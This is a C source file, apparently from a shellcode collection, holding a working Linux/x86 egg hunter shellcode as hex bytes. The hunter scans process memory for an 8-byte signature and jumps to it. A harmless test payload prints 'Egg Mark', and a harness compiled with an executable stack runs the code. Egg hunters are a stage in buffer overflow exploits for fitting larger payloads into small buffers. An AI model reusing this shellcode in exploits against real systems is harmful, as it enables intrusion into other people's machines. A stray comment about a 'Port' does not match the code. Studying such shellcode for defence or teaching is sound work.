/*

 Egg Hunter Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 egg_hunter_shellcode

 * 39 bytes
 * null-free if egg signature is


 # gcc -m32 -fno-stack-protector -z execstack egg_hunter_shellcode.c -o egg_hunter_shellcode

 Testing
 # ./egg_hunter_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char egg[] = \

// Write "Egg Mark" and exit

"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xdb"
"\xf7\xe3\xb0\x04\x6a\x0a\x68\x4d\x61\x72"
"\x6b\x68\x45\x67\x67\x20\xb3\x01\x89\xe1"
"\xb2\x09\xcd\x80\xb0\x01\xcd\x80";

unsigned char egghunter[] = \

// Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)

"\x31\xf6\xf7\xe6\x66\x81\xca\xff\x0f\x42"
"\x6a\x21\x58\x8d\x5a\x04\x56\x59\xcd\x80"
"\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50\x89"
"\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(egghunter));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Setting the egg hunter signature to search (byte reverse order)

		 "movl $0x50905090, (egghunter+25)\n\t"

	// Calling the shellcode
		 "call egghunter");

}
